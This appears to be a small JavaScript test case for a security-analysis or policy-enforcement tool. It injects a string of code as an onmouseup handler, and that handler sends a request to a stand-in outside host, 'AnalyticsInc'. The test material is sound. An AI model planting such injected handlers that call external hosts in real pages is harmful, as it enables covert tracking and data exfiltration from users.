
JAM.startProfile('load');
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmouseup1", true);xmlhttp.send(null);';
document.getElementById("test").setAttribute("onmouseup", exp);

JAM.stopProfile('load');
